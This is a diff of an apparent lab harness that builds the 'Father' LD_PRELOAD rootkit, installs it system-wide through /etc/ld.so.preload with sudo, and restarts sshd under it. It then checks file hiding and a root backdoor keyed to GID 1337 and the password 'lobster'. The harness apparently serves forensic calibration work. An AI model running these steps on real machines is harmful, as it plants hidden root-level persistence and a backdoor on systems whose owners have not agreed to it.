@@ -29,71 +29,34 @@ SOURCE_PORT = 54321
 SHELL_PASSWORD = b"lobster\0"
 
 COMMANDS = (
-    "set -o pipefail",
-    f"root={REMOTE_ROOT}",
-    'source_dir="$root/source"; '
-    'father_source_tree="$source_dir/Father-4eb2712caf612a7dc55fd4f34ff5c72b74c7c332"; '
-    'father_archive="$source_dir/father-upstream-4eb2712.tar"; '
-    'father_config="$father_source_tree/src/config.h"; '
-    'father_library="$father_source_tree/rk.so"; '
-    'probe_dir="$root/probe"; marker="$probe_dir/__malicious_file"; '
-    'before_output="$probe_dir/before.txt"; after_output="$probe_dir/after.txt"',
-    'echo "[father] checking prerequisites and unpacking pinned source"',
-    "command -v gcc >/dev/null",
-    "command -v make >/dev/null",
-    "command -v systemctl >/dev/null",
-    "test -x /usr/bin/python3 && test -x /usr/bin/setsid && "
-    "test -x /usr/bin/sleep && test -x /bin/ls",
-    "test -f /usr/include/security/pam_appl.h && "
-    "test -f /usr/include/gcrypt.h",
-    "ldconfig -p | grep 'libgcrypt\\.so' >/dev/null",
-    f'mkdir -p "$source_dir" "$probe_dir" && mv -- {UPLOAD_PATH} "$father_archive"',
-    'rm -rf "$father_source_tree" && tar -xf "$father_archive" -C "$source_dir"',
-    'test -f "$father_config"',
+    f'root={REMOTE_ROOT}; '
+    'source="$root/Father-4eb2712caf612a7dc55fd4f34ff5c72b74c7c332"; '
+    'hidden_dir="$root/probe"; hidden_file="$hidden_dir/__malicious_file"',
+    f'rm -rf "$root" && mkdir -p "$hidden_dir" && tar -xf {UPLOAD_PATH} -C "$root"',
     "sed -i "
     "-e 's|^#define STRING .*|#define STRING \"__malicious_\"|' "
     "-e 's|^#define PRELOAD .*|#define PRELOAD \"father_calibration_nohide\"|' "
     f"-e 's|^#define INSTALL_LOCATION .*|#define INSTALL_LOCATION \"{INSTALLED_LIBRARY}\"|' "
-    '"$father_config"',
-    'grep -Fqx \'#define GID 1337\' "$father_config"',
-    'grep -Fqx \'#define SOURCEPORT 54321\' "$father_config"',
-    'grep -Fqx \'#define SHELL_PASS "lobster"\' "$father_config"',
-    'grep -Fqx \'#define STRING "__malicious_"\' "$father_config"',
-    'grep -Fqx \'#define PRELOAD "father_calibration_nohide"\' "$father_config"',
-    f'grep -Fqx \'#define INSTALL_LOCATION "{INSTALLED_LIBRARY}"\' "$father_config"',
-    'sha256sum "$father_config"',
-    'echo "[father] building and activating the shared object"',
-    'cd "$father_source_tree" && make father',
-    'test -f "$father_library" && sha256sum "$father_library"',
-    'touch "$marker" && ls -1 -- "$probe_dir" > "$before_output"',
-    "grep -Fqx '__malicious_file' \"$before_output\"",
-    f'sudo -n install -d -m 0755 "$(dirname {INSTALLED_LIBRARY})"',
-    f'sudo -n install -m 0644 "$father_library" {INSTALLED_LIBRARY}',
-    f"sudo -n env LD_PRELOAD={INSTALLED_LIBRARY} /usr/bin/python3 -c "
-    "'from pathlib import Path; import sys; "
-    "assert sys.argv[1] in Path(\"/proc/self/maps\").read_text()' "
-    f"{INSTALLED_LIBRARY}",
-    f"printf '%s\\n' {INSTALLED_LIBRARY} | sudo -n tee {PRELOAD_CONFIG} >/dev/null && "
-    f"sudo -n chmod 0644 {PRELOAD_CONFIG}",
-    'echo "[father] keeping three mapped root processes alive for acquisition"',
+    '"$source/src/config.h"',
+    'cd "$source" && make father',
+    'sha256sum "$source/rk.so"',
+    f'sudo -n install -D -m 0644 "$source/rk.so" {INSTALLED_LIBRARY}',
+    'touch "$hidden_file"',
+    'ls -la -- "$hidden_dir"',
+    f"printf '%s\\n' {INSTALLED_LIBRARY} | sudo -n tee {PRELOAD_CONFIG}",
+    'after_listing="$(ls -la -- "$hidden_dir")"; '
+    "printf '%s\\n' \"$after_listing\"; "
+    '[[ "$after_listing" != *"__malicious_file"* && -e "$hidden_file" ]]',
     "pids=(); for _ in 1 2 3; do "
-    "pid=\"$(sudo -n /bin/sh -c "
+    "pids+=(\"$(sudo -n /bin/sh -c "
     "'/usr/bin/setsid /usr/bin/sleep \"$1\" </dev/null >/dev/null 2>&1 & echo $!' "
-    f"sh {PROCESS_DURATION_SECONDS})\"; "
-    '[[ "$pid" =~ ^[1-9][0-9]*$ ]] || break; pids+=("$pid"); '
-    'done; [[ "${#pids[@]}" -eq 3 ]]',
+    f"sh {PROCESS_DURATION_SECONDS})\"); done",
     "sleep 1; all_mapped=true; for pid in \"${pids[@]}\"; do "
-    f'sudo -n kill -0 "$pid" && sudo -n grep -Fq {INSTALLED_LIBRARY} "/proc/$pid/maps" '
-    '|| all_mapped=false; done; [[ "$all_mapped" == true ]]',
-    'echo "[father] restarting sshd under Father and validating file hiding"',
+    f'sudo -n grep -Fq {INSTALLED_LIBRARY} "/proc/$pid/maps" '
+    '|| all_mapped=false; done; '
+    '[[ "${#pids[@]}" -eq 3 && "$all_mapped" == true ]]',
     "sudo -n systemctl restart ssh.service",
-    'sshd_pid="$(sudo -n systemctl show --property=MainPID --value ssh.service)"; '
-    '[[ "$sshd_pid" =~ ^[1-9][0-9]*$ ]]',
-    f'sudo -n grep -Fq {INSTALLED_LIBRARY} "/proc/$sshd_pid/maps"',
-    'ls -1 -- "$probe_dir" > "$after_output"',
-    'after_listing="$(< "$after_output")"; '
-    '[[ "$after_listing" != *"__malicious_file"* ]]',
-    '[[ "$after_listing" == *"before.txt"* ]] && [[ -e "$marker" ]]',
+    'sshd_pid="$(sudo -n systemctl show --property=MainPID --value ssh.service)"',
     "printf 'FATHER_RESULT pids=%s,%s,%s sshd_pid=%s\\n' "
     '"${pids[0]}" "${pids[1]}" "${pids[2]}" "$sshd_pid"',
 )
@@ -171,9 +134,7 @@ def run_father(
         "preload_config_path": PRELOAD_CONFIG,
         "affected_pids": [int(value) for value in match.groups()[:3]],
         "sshd_pid": int(match.group(4)),
-        "marker_path": f"{REMOTE_ROOT}/probe/__malicious_file",
-        "hiding_before_output_path": f"{REMOTE_ROOT}/probe/before.txt",
-        "hiding_after_output_path": f"{REMOTE_ROOT}/probe/after.txt",
+        "hidden_file_path": f"{REMOTE_ROOT}/probe/__malicious_file",
         "file_hiding_passed": True,
         "father_backdoor_passed": True,
         "backdoor_identity": identity,
@@ -359,7 +320,7 @@ def _validate_backdoor(
         line.strip()
         for line in response_text.splitlines()
         if "uid=0(root)" in line and "gid=1337" in line
-    )
+    ).removeprefix("\x1b[0m")
     append_record(
         command_log_path,
         {
